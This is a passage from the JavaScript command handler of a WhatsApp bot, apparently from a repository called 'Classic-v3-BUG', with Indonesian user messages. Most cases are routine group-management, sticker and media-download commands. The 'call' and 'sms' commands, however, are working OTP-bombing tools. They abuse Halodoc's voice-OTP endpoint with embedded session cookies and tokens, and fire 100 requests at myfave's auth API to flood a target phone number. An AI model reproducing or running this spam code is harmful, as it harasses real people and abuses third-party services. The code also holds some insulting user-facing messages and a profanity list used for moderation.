if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await zetsubo.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await zetsubo.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break
//=================================================//
case 'join': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await zetsubo.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'editsubjek': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
await loading()
await zetsubo.groupUpdateSubject(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'editdesk':{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await loading()
await zetsubo.groupUpdateDescription(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══᪣⧠ *࿉ 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐕-3࿉* ⧠᪣══
 ➲ *REPORT : ${q ? q : '𝐓𝐀𝐆𝐆𝐄𝐃'}*\n\n`
for (let mem of participants) {
teks += `🎲 @${mem.id.split('@')[0]}\n`
}
zetsubo.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case'demoteall':
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await zetsubo.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
zetsubo.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case'promoteall':
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await zetsubo.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
zetsubo.groupParticipantsUpdate(from, mems, 'promote')
break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await zetsubo.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await zetsubo.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'inspect': {
if (isBan) return reply('*Lu Di Ban Owner*')
await loading()
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
zetsubo.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await zetsubo.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
zetsubo.sendFile(from, pp, "", m, { caption: tekse, mentions: await zetsubo.parseMention(tekse) })

})
}
break
//=================================================
case 'bugggg': { 
if (isBan) return reply('*Lu Di Ban Owner*')
joauuuuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
}
break
//=================================================
case "welcome":
{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(from)
var groupe = await zetsubo.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
zetsubo.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
//=================================================
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await zetsubo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
zetsubo.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'antilink': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
reply('Succes mematikan antilink di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================
case 'autodelete': {
if (!isCreator) return
if (args.length < 1) return
if (args[0] === "on") {
if (autodelete) return
antidel.push(from)
} else if (args[0] === "off") {
if (!autodelete) return
let off = antidel.indexOf(from)
antidel.splice(off, 1)
} else {
}
}
break
//=================================================
case "antitoxic":
{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await zetsubo.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
zetsubo.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
//=================================================
case 'larangan': case 'peraturan': {
await loading()
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
zetsubo.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst
babi
kontol
memek
penis
pukimak
tolol
gblg
gblok` , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//=================================================//
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (!welcmm) return
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isCreator) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nOwner telah Toxic, owner bebas Toxic apa pun`})
await zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
zetsubo.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
}
break
//=================================================//
case "call":
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6289503267904`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6289503267904`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
//=================================================
case 'sms': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ZetsuboXygen `);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6289503267904`)
reply(`spam sms/call akan di kirim ke no target`)
}
break
//=================================================//
case 'yts': case 'ytsearch': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
zetsubo.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
//=================================================
case 'runtime':
                let pinga = `𝐂𝐥𝐚𝐬𝐬𝐢𝐜 𝐁𝐨𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
                zetsubo.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'zetszet/cheemspic.jpg',
                            sourceUrl: 'https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
//=================================================
case 'ytmp4': case 'youtubemp4':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
    loading()
			axios.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					zetsubo.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
						zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
			break
//=================================================
case 'memancing': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================
case 'getvideo': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
zetsubo.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================
case "ytreels": case "youtubereels":{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) return reply('Masukan Link Nya!!!')
await loading ()
downloadMp4(text)
}
break
//=================================================
case 'tiktokvideo':{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
await loading ()
require('./lib/tiktok').Tiktok(q).then( data => {
zetsubo.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
//=================================================
case 'tiktokmp3':
case 'tiktokaudio':{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
await loading ()
require('./lib/tiktok').Tiktok(q).then( data => {
zetsubo.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=================================================
case 'igvideo': case 'igreels':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
			await loading()
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				zetsubo.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
			})
			break
		case 'fbvideo':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			await loading()
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				zetsubo.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn` })
			})
			break
			
			case 'twitvideo':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				zetsubo.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
			})
			break
//=================================================//
case 'wm': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
var teks = `${text}`
{
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zetsubo.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
}
}
}
break
//=================================================// 
case 'ping': {
  const startTime = new Date();
  const pingMsg = await zetsubo.sendMessage(m.chat, { text: '*Classifying*' });

 await zetsubo.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*𝕮𝖑𝖆𝖘𝖘𝖎𝖋𝖎𝖊𝖉 ➟* *${new Date() - startTime}* 𝐌/𝐒`
        }
      }
    }, {});
  } 
break;
//=================================================//
// Textprome //
case 'blackpink':
case 'neon':
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
	if (args.length == 0) return reply(`Example: ${prefix + command} ZetsuboXygen`)
	await loading()
	zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${command}` } })
	break
//=================================================//
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return reply('😹')
await loading()
 zetsubogans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await zetsubo.sendMessage(from, { audio: zetsubogans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
title: `KING SAM`,
sourceUrl: `https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk`, 
}
}})
break
//=================================================//
case 'gambar': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'sc': case 'script': case 'repo':

 zetsubo.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/b103691007c8ce5ee8a94.jpg` }, caption: 
`╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮\n\n ➨ 𝑯𝒊 *${pushname}* \n\n ➨ 𝑰 𝒂𝒎 𝑪𝑳𝑨𝑺𝑺𝑰𝑪_𝑨𝑰 𝑩𝑶𝑻 ☣.\n\n ➨ 𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.\n\n ➨ 𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.\n\n ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/Samue-l1/Classic-v3-BUG ❵\n\n ➨ 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.\n\n ➨ 𝑴𝒂𝒅𝒆 𝑩𝒚 ➻ 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 ✇\n\n╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯⸼` });

   break;
//=================================================
case 'cecanmalaysia': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'broadcast':
            case 'bcgroup': {
                if (!isCreator) return reply(mess.owner)
